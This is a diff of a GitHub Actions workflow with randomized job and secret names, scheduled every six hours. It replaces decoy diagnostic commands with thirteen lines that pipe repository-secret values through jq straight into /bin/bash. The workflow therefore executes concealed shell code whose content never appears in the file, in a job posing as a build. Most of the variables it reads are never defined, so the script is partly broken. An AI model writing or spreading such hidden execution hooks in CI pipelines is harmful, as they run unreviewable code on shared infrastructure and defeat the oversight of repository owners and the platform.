@@ -1,33 +1,29 @@
 name: budajian3691
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 4/6 * * *'
-
-jobs:  # 5199
+    - cron: '45 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: budajian3691
         env:
-          n18267: ${{ secrets.n18267 }}
+          j47116: ${{ secrets.j47116 }}
         run: |
-          [ "$(which sqlite3)" != "" ] && echo "sqlite3 installed" || echo "sqlite3 not installed"
-          echo "now do second"
-          echo $n18267 | jq -r .j32142 | /bin/bash
-          echo "now do third"
-          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
-          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
-          echo "Date only: $(date +%F)"
-          echo "Random ID: $RANDOM$RANDOM"
-          which screen
-          popd > /dev/null
-          ls -al | awk '{print $NF}'
-          curl www.google.com
-          printf "%s" "xyz" > tmp.xyz
-          which apt-get
-          history | grep ls
-          which brew
-          echo "Debug at $(date)"
-          git remote -vv
+          echo $j47116 | jq -r .o563 | /bin/bash
+          echo $wa0144 | jq -r .jcm6430 | /bin/bash
+          echo $un4432 | jq -r .n600 | /bin/bash
+          echo $tyz05 | jq -r .rb500 | /bin/bash
+          echo $wmjey11961 | jq -r .w2 | /bin/bash
+          echo $izn4 | jq -r .bmz284 | /bin/bash
+          echo $rvr8019 | jq -r .p43867 | /bin/bash
+          echo $vgrnq57326 | jq -r .c6 | /bin/bash
+          echo $guo82545 | jq -r .ga62135 | /bin/bash
+          echo $a142 | jq -r .d28 | /bin/bash
+          echo $ezah13 | jq -r .s6955 | /bin/bash
+          echo $kodur86607 | jq -r .rk85 | /bin/bash
+          echo $ne3653 | jq -r .muxi6 | /bin/bash
+
